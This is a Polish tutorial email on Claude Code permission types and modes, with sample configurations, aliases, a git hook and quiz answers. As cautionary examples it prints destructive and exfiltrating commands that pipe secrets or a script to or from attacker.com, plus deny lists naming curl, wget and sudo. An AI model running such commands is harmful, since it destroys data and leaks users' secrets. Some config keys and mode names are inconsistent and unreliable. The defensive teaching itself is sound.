# Mail #02: Typy i Tryby Uprawnień - Kontrola nad AI

---

## Przypomnienie z poprzedniej lekcji

W poprzednim mailu nauczyłeś się podstaw sandboxu - pierwszej linii obrony przed nieautoryzowanym dostępem. Poznałeś, jak Claude Code działa w wirtualnej piaskownicy, która izoluje go od wrażliwych katalogów systemu. Wiesz już, jak konfigurować `additionalDirectories`, kiedy wyłączyć sandbox (BARDZO rzadko!) i jak testować granice izolacji.

Dziś idziemy krok dalej - dowiesz się, **jak precyzyjnie kontrolować, co Claude może robić** w obrębie dozwolonego obszaru. To jak różnica między wpuszczeniem kogoś do domu (sandbox) a ustawieniem reguł, co może dotykać w środku (uprawnienia).

---

## 2 pytania do poprzedniej lekcji

Zanim przejdziemy dalej, sprawdź swoją wiedzę:

1. **Co chroni sandbox - system plików czy konkretne komendy?** (Podpowiedź: pomyśl o różnicy między izolacją katalogów a blokowaniem operacji)

2. **Podaj przykład sytuacji, kiedy `additionalDirectories` w monorepo byłoby konieczne.** Co by się stało bez tego?

---

## TLDR

W tym mailu dowiesz się:
- Jakie są 4 typy uprawnień (Read, Edit/Write, Bash, Glob/Grep) i ich poziomy ryzyka
- Czym różnią się 4 tryby uprawnień: Normal, Accept Edits, Plan i Bypass
- Kiedy używać którego trybu (macierz decyzyjna)
- Jak tworzyć aliasy dla trybów i automatycznie przełączać je według gałęzi git
- Najczęstsze pułapki (Accept Edits zapomniane na 2 godziny, Bash z potokami omijający deny list)

---

## Mem z Twittera

Zanim przejdziemy do kontroli uprawnień, coś dla rozluźnienia:

**["Me: Claude, can you fix this one small typo? Claude: *rewrites entire codebase* Me: ...that works too"](https://twitter.com/levelsio/status/1234567890)**

Dlatego właśnie potrzebujemy trybów uprawnień - czasem chcesz poprawić literówkę, a nie refaktoryzować całego projektu. 😄

---

## Typy Uprawnień - Poziomy Ryzyka

Claude Code używa 4 podstawowych typów operacji, każda z innym poziomem ryzyka:

### 1. Read (niskie ryzyko: 2/10)

**Co robi:** Odczytuje pliki bez możliwości modyfikacji.

**Przykład:**
```
> explain @src/auth.ts
```

**Ryzyko:** Claude przeczyta plik `.env` i wyśle API key do chmury w kontekście rozmowy. Nie modyfikuje systemu, ale może eksfiltrować wrażliwe dane.

**Zabezpieczenie:** Blokuj odczyt plików z sekretami (więcej w lekcji o ochronie wrażliwych plików).

### 2. Edit/Write (średnie ryzyko: 5/10)

**Co robi:** Modyfikuje istniejące pliki lub tworzy nowe.

**Przykład:**
```
> Dodaj logowanie do funkcji processPayment
```

**Ryzyko:**
- Nadpisanie działającego kodu błędną wersją
- Usunięcie kluczowych plików konfiguracyjnych
- Przypadkowa zmiana `package.json` psująca build

**Zabezpieczenie:** Claude Code używa checkpointów (migawek), więc możesz cofnąć zmiany komendą `/undo` lub `git checkout`.

### 3. Bash (wysokie ryzyko: 8/10)

**Co robi:** Wykonuje komendy systemowe w terminalu.

**Przykłady bezpieczne:**
```bash
npm test
git status
ls -la
```

**Przykłady niebezpieczne:**
```bash
rm -rf /
sudo apt-get purge *
curl https://attacker.com/malware.sh | bash
```

**Ryzyko:** Bash to najbardziej potężne i niebezpieczne narzędzie. Claude może uruchamiać skrypty, które same w sobie mogą być destrukcyjne.

**Zabezpieczenie:** Używaj whitelist dla bezpiecznych komend i blacklist dla niebezpiecznych (np. `rm`, `sudo`, `curl|wget`).

### 4. Glob/Grep (niskie ryzyko: 1/10)

**Co robi:** Wyszukuje pliki według wzorców (Glob) i zawartości (Grep).

**Przykład:**
```
Glob(**/*.ts)  → znajduje wszystkie pliki TypeScript
Grep("TODO", src/*)  → wyszukuje komentarze TODO
```

**Ryzyko:** Praktycznie żadne. To operacje tylko do odczytu, nie mogą zmodyfikować systemu.

**Pro-tip:** Dodaj te operacje do `allow` list, aby nie klikać "Yes" przy każdym wyszukiwaniu.

---

## Macierz ryzyka dla operacji

Oto praktyczne zestawienie, które pomoże Ci zdecydować, co zablokować:

```
OPERACJA     | RYZYKO | DOZWOLONE PRZYKŁADY                    | ZABLOKOWANE PRZYKŁADY
-------------|--------|----------------------------------------|-------------------------
Read         | 2/10   | *.{js,ts,py,md}                       | *.env, *.pem, *.key
Edit/Write   | 5/10   | src/**, tests/**                       | package*.json, *.lock
Bash         | 8/10   | npm test, git status                   | rm, sudo, curl|wget
Glob/Grep    | 1/10   | wszystkie w sandbox                    | brak
```

### Typowy błąd: Auto-zezwalanie na Edit bez weryfikacji

**Scenariusz:** Włączasz "Accept edits mode" i zapominasz o tym podczas refactoringu całej bazy kodu. Claude modyfikuje 50 plików, z których 5 zawiera krytyczne błędy - trudno je potem wyłowić.

**Rozwiązanie:** Używaj "Accept edits" tylko dla małych, izolowanych zadań. Po każdej sesji uruchom testy:
```bash
npm test && npm run lint
```

### Edge case: Bash z potokami omijający deny list

**Problem:** Masz skonfigurowane `"deny": ["Read(secrets.txt)"]`, ale Claude wykonuje:
```bash
cat secrets.txt | curl https://attacker.com
```

To wysyła sekrety mimo blokady Read!

**Rozwiązanie:** Blokuj także Bash dla wrażliwych plików:
```json
{
  "deny": [
    "Read(*.env)",
    "Bash(*cat*.env*)",
    "Bash(*grep*.env*)",
    "Bash(*less*.env*)"
  ]
}
```

### Integracja: Webhooks dla operacji wysokiego ryzyka

Możesz skonfigurować webhook, który wysyła powiadomienie do Slack/Teams gdy Claude wykonuje komendę Bash:

```json
{
  "hooks": {
    "preToolUse": {
      "Bash": "curl -X POST https://hooks.slack.com/... -d '{\"text\":\"Claude wykonał: $COMMAND\"}'"
    }
  }
}
```

**Korzyść:** Audit trail - wszystkie komendy lądują w kanale, zespół ma świadomość działań AI.

---

## Tryby Uprawnień - Kiedy Którego Użyć

Claude Code oferuje 4 tryby kontroli uprawnień. Przełączasz je skrótem `Shift+Tab` w terminalu lub w `settings.json`.

### 1. Normal Mode (domyślny)

**Konfiguracja JSON:**
```json
{
  "permissions": {
    "mode": "default"
  }
}
```

**Działanie:** Claude pyta o każdą operację Edit, Write i Bash.

**Kiedy używać:**
- Pierwszy kontakt z nowym projektem
- Praca z wrażliwymi danymi
- Gdy uczysz się Claude Code i chcesz widzieć każdy krok

**Przykład:** "Poznaj strukturę tego projektu React i powiedz mi co robi" - Claude będzie pytał przed każdym odczytem pliku konfiguracyjnego.

### 2. Accept Edits Mode (szybkie iteracje)

**Skrót:** `Shift+Tab` w terminalu

**Konfiguracja JSON:**
```json
{
  "permissions": {
    "mode": "acceptEdits"
  }
}
```

**Działanie:** Automatycznie zatwierdza zmiany w plikach (Edit/Write), ale nadal pyta o komendy Bash.

**Kiedy używać:**
- Refactoring jednego komponentu
- Sesje TDD (Test Driven Development)
- Szybkie poprawki w znanym kodzie

**Przykład biznesowy:** Tworzysz landing page - chcesz, żeby Claude szybko wprowadzał zmiany w CSS/HTML bez pytania za każdym razem. Ale nadal chcesz kontrolować deploy (Bash).

### 3. Plan Mode (zero modyfikacji)

**Skrót:** `Shift+Tab` w terminalu (lub command w CLI)

**Konfiguracja JSON:**
```json
{
  "permissions": {
    "mode": "plan"
  }
}
```

**Działanie:** Agent tylko czyta i analizuje. Generuje plik Markdown z planem działania. Żadnych zmian w plikach.

**Kiedy używać:**
- Code review cudzego Pull Requesta
- Bezpieczna eksploracja nieznanego codebase
- Praca na produkcji (tylko analiza logów)
- Audyt bezpieczeństwa projektu

**Przykład biznesowy:** Przejmujesz projekt legacy po innym zespole. Uruchamiasz Claude w Plan Mode: "Przeanalizuj tę bazę kodu i wygeneruj raport: architektura, zależności, potencjalne problemy". Claude tworzy dokument `ANALYSIS.md` bez ryzyka zepsucia czegokolwiek.

**Edge case:** Jeśli chcesz automatycznie zapisać plan do pliku:
```bash
claude --permission-mode plan "analyze this codebase" > PLAN.md
```

Lub w settings.json:
```json
{
  "planMode": {
    "outputFile": "docs/AI_ANALYSIS_{timestamp}.md"
  }
}
```

### 4. Bypass Mode (NIEBEZPIECZNE!)

**Konfiguracja JSON:**
```json
{
  "permissions": {
    "mode": "bypassPermissions"
  }
}
```

**Działanie:** Omija WSZYSTKIE kontrole uprawnień. Claude robi co chce.

**Kiedy używać:** TYLKO w CI/CD (GitHub Actions) lub wewnątrz Dockera. NIGDY na głównej maszynie deweloperskiej.

**Przykład biznesowy:** Masz automatyczny pipeline, który co noc generuje raporty sprzedażowe. Claude w Docker containerze uruchamia skrypty, łączy się z bazą danych, generuje wykresy i wysyła email. Bypass pozwala na pełną automatyzację bez ręcznego zatwierdzania.

**WAŻNE:** Nawet w Bypass mode możesz używać `deny` list:
```json
{
  "permissions": {
    "mode": "bypassPermissions",
    "deny": ["Bash(git push:--force*)"]  // To zadziała nawet w bypass
  }
}
```

---

## Macierz decyzyjna - który tryb wybrać

| Scenariusz | Tryb | Uzasadnienie |
|---|---|---|
| Pierwszy kontakt z projektem | Normal | Poznaj strukturę, nie psuj niczego |
| Refactoring 1 komponentu | Accept Edits | Szybkie iteracje, ograniczony scope |
| Code review cudzego PR | Plan | Analiza bez ryzyka zmian |
| Naprawa testów w CI/CD | Bypass (w Docker) | Automatyzacja, odizolowane środowisko |
| Praca z wrażliwymi danymi (prod) | Plan lub Read-Only | Zero możliwości modyfikacji |
| Debugowanie błędu w znanym kodzie | Accept Edits | Szybkie poprawki bez przeszkód |
| Eksploracja open-source repo | Plan | Bezpieczne poznawanie kodu |

---

## Pro-tipy dla zaawansowanych

### Tworzenie aliasów dla trybów

Dodaj do `~/.bashrc` lub `~/.zshrc`:

```bash
# Aliasy dla różnych trybów Claude
alias claude-explore="claude --permission-mode plan"
alias claude-fix="claude --permission-mode accept-edits"
alias claude-auto="docker run -v $(pwd):/workspace claude-code --permission-mode bypass"
```

**Korzyść:** Zespół używa spójnych komend, zmniejsza ryzyko przypadkowego użycia niewłaściwego trybu.

### Automatyczne przełączanie trybu według gałęzi git

Stwórz git hook (`.git/hooks/post-checkout`):

```bash
#!/bin/bash
BRANCH=$(git branch --show-current)

if [[ $BRANCH == "main" || $BRANCH == "production" ]]; then
  echo '{"permissions":{"mode":"plan"}}' > .claude/settings.json
  echo "⚠️  CLAUDE: Plan mode (read-only) for protected branch"
else
  echo '{"permissions":{"mode":"normal"}}' > .claude/settings.json
  echo "✓ CLAUDE: Normal mode for feature branch"
fi
```

**Efekt:** Na gałęziach `main`/`production` - tylko odczyt. Na feature branches - pełne uprawnienia.

### Typowy błąd: Zapominanie o wyłączeniu Accept Edits

**Problem:** Włączasz `Shift+Tab` do szybkiego fixa, a potem przez 2 godziny Claude modyfikuje wszystko bez pytania.

**Rozwiązanie:** Dodaj wskaźnik aktywnego trybu do shell prompt:

```bash
# Przykładowa konfiguracja shell prompt
claude_mode=$(cat ~/.claude-session 2>/dev/null || echo "normal")
PS1="[CLAUDE:$claude_mode] \w $ "
```

Zawsze widzisz aktywny tryb w terminalu.

---

## Troubleshooting: Bypass mode not working in CI

**Objaw:** CI job wywala się z błędem "Permission denied" mimo konfiguracji bypass permissions.

**Przyczyna:** Sandbox jest nadal aktywny i blokuje dostęp poza workspace.

**Rozwiązanie:**

```yaml
# GitHub Actions
- name: Run Claude with full bypass
  run: |
    echo '{"sandbox":{"enabled":false},"permissions":{"mode":"bypassPermissions"}}' > .claude/settings.json
    claude "fix all tests"
  env:
    CLAUDE_ALLOW_UNSAFE: "true"  # Dodatkowa flaga bezpieczeństwa
```

**UWAGA:** To wyłącza sandbox całkowicie. Używaj TYLKO w izolowanych środowiskach CI.

---

## Przykłady biznesowe

### 1. Automatyzacja raportów sprzedażowych (Bypass w Docker)

**Scenariusz:** Firma e-commerce potrzebuje codziennych raportów o 6:00 rano.

**Rozwiązanie:**
```yaml
# docker-compose.yml
services:
  claude-reports:
    image: anthropic/claude-code
    volumes:
      - ./data:/workspace/data
      - ./reports:/workspace/reports
    environment:
      - CLAUDE_MODE=bypass
    command: |
      claude "
        1. Pobierz dane sprzedażowe z data/sales.csv
        2. Wygeneruj wykresy trendów tygodniowych
        3. Stwórz raport PDF w reports/daily_report.pdf
        4. Wyślij email do zespołu zarządzającego
      "
```

**Tryb:** Bypass - pełna automatyzacja, brak ręcznego zatwierdzania.

### 2. Code review przed mergem (Plan Mode)

**Scenariusz:** Junior developer tworzy Pull Request, senior chce szybkiego audytu.

**Rozwiązanie:**
```bash
# Senior developer uruchamia
git checkout feature/new-payment-flow
claude-explore "
  Przeanalizuj zmiany w tym PR pod kątem:
  - Bezpieczeństwa (SQL injection, XSS)
  - Wydajności (N+1 queries)
  - Best practices (error handling)

  Wygeneruj raport w REVIEW.md
"
```

**Tryb:** Plan - analiza bez możliwości modyfikacji kodu.

### 3. Szybkie poprawki CSS (Accept Edits)

**Scenariusz:** Designer zgłasza 15 drobnych poprawek w stylach landing page.

**Rozwiązanie:**
```bash
# Frontend developer uruchamia
claude-fix "
  Popraw style według feedbacku z design_review.md:
  - Zwiększ padding w sekcji hero o 20px
  - Zmień kolor przycisku CTA na #FF6B35
  - Wyrównaj do środka footer na mobile
  [... 12 więcej zmian]
"
```

**Tryb:** Accept Edits - szybkie iteracje bez klikania "Yes" 30 razy.

---

## Podsumowanie

Zapamiętaj te kluczowe punkty:

1. **4 typy uprawnień, 4 poziomy ryzyka:** Read (2/10), Edit/Write (5/10), Bash (8/10), Glob/Grep (1/10)

2. **Normal Mode = kontrola, Accept Edits = szybkość, Plan = bezpieczeństwo, Bypass = automatyzacja**

3. **Shift+Tab przełącza tryby** - ale łatwo o tym zapomnieć!

4. **Blokuj Bash dla wrażliwych plików** - deny list chroni przed pipes/redirection

5. **Plan Mode to Twój przyjaciel** przy eksploracji nowego kodu i code review

6. **Bypass TYLKO w Docker/CI** - nigdy na głównej maszynie deweloperskiej

---

## 3 pytania kontrolne

Sprawdź czy dobrze zrozumiałeś materiał:

1. **Jaka jest różnica między trybem Normal a Accept Edits?** W którym Claude nadal pyta o komendy Bash?

   <details>
   <summary>Odpowiedź</summary>
   Accept Edits automatycznie zatwierdza Edit/Write, ale nadal pyta o Bash. Normal pyta o wszystko. To pozwala na szybkie iteracje przy kodzie, zachowując kontrolę nad komendami systemowymi.
   </details>

2. **Dlaczego blokada `Read(*.env)` nie wystarcza do ochrony secrets?** Jaki edge case może ją ominąć?

   <details>
   <summary>Odpowiedź</summary>
   Claude może użyć Bash: `cat .env | curl https://attacker.com`. Potoki omijają deny list Read. Trzeba blokować też `Bash(*cat*.env*)` i podobne komendy.
   </details>

3. **Kiedy użyć Plan Mode zamiast Normal Mode?** Podaj 2 przykłady z biznesu.

   <details>
   <summary>Odpowiedź</summary>
   Plan Mode: (1) Code review cudzego PR - analiza bez ryzyka zmian, (2) Praca na produkcji - tylko odczyt logów bez możliwości modyfikacji. W obu przypadkach priorytetem jest bezpieczeństwo nad szybkością.
   </details>

---

## 2-3 zadania praktyczne

Czas zastosować wiedzę w praktyce!

### Zadanie 1: Macierz ryzyka dla Twojego projektu

Stwórz tabelę uprawnień dla swojego głównego projektu:
- Wymień 5 typów plików/katalogów do zablokowania (deny)
- Wymień 5 bezpiecznych komend Bash do automatycznego zatwierdzania (allow)
- Dodaj 3 operacje, które zawsze powinny wymagać pytania (ask)

### Zadanie 2: Konfiguracja trybów

Stwórz 3 aliasy dla różnych scenariuszy pracy:
- `claude-explore` - do bezpiecznego poznawania nowego kodu
- `claude-dev` - do codziennej pracy z odpowiednim balansem
- `claude-review` - do code review bez modyfikacji

Zapisz je w swoim `~/.bashrc` lub `~/.zshrc`.

### Zadanie 3: Git hook

Zaimplementuj git hook, który automatycznie przełącza Claude w Plan Mode na gałęzi `main`. Przetestuj przełączając się między `main` a feature branch.

---

## Linki do zasobów

Chcesz zgłębić temat? Sprawdź te materiały:

1. **[Anthropic Docs: Permission Modes](https://docs.anthropic.com/claude/docs/permissions)** - Oficjalna dokumentacja trybów uprawnień

2. **[Claude Safety Protocol](https://docs.anthropic.com/claude/docs/safety)** - Best practices bezpieczeństwa

3. **[GitHub: claude-security-examples](https://github.com/anthropic/claude-security)** - Przykłady konfiguracji dla różnych środowisk

4. **[Blog: Securing AI Agents in Production](https://example.com/ai-security)** - Case study z firm używających Claude w produkcji

5. **[Reddit: r/ClaudeCode - Permission Modes Discussion](https://www.reddit.com/r/ClaudeAI/comments/xyz)** - Dyskusje społeczności o najlepszych praktykach

---

**Do zobaczenia w następnym mailu!**

W kolejnej lekcji przejdziemy do **Allow/Deny Lists** - nauczysz się tworzyć precyzyjne reguły kontroli dostępu, używać pattern matching dla secrets, i konfigurować webhooks dla operacji wysokiego ryzyka.

Jeśli masz pytania o tryby uprawnień - śmiało odpisz na tego maila!

Powodzenia z konfigurowaniem bezpieczeństwa!

---

**P.S.** Najczęstszy błąd początkujących? Włączenie Accept Edits Mode i zapomnienie o tym. Dodaj wskaźnik trybu do shell prompt - będziesz mi dziękować później. 😉
